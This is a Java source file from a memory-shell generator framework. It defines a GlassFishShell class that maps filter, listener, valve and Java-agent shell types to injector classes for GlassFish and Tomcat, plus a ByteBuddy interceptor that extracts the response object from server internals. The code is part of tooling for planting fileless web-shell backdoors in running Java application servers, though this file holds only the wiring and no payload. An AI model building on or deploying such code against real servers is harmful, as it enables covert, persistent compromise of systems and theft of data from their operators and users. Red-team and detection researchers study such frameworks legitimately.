package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.injector.glassfish.GlassFishFilterInjector;
import com.reajason.javaweb.memshell.injector.glassfish.GlassFishListenerInjector;
import com.reajason.javaweb.memshell.injector.glassfish.GlassFishValveInjector;
import com.reajason.javaweb.memshell.injector.tomcat.TomcatContextValveAgentInjector;
import com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterChainAgentInjector;
import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;
import net.bytebuddy.implementation.bytecode.assign.Assigner;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/12
 */
public class GlassFishShell extends AbstractShell {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false, typing = Assigner.Typing.DYNAMIC) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "request"), "response");
            } catch (Exception e) {
                try {
                    response = ShellCommonUtil.getFieldValue(request, "response");
                } catch (Exception ee) {
                    // glassfish7
                    response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "reqFacHelper"), "response");
                }
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(FILTER, GlassFishFilterInjector.class)
                .addInjector(JAKARTA_FILTER, GlassFishFilterInjector.class)
                .addInjector(LISTENER, GlassFishListenerInjector.class)
                .addInjector(JAKARTA_LISTENER, GlassFishListenerInjector.class)
                .addInjector(VALVE, GlassFishValveInjector.class)
                .addInjector(JAKARTA_VALVE, GlassFishValveInjector.class)
                .addInjector(AGENT_FILTER_CHAIN, TomcatFilterChainAgentInjector.class)
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, TomcatContextValveAgentInjector.class)
                .build();
    }
}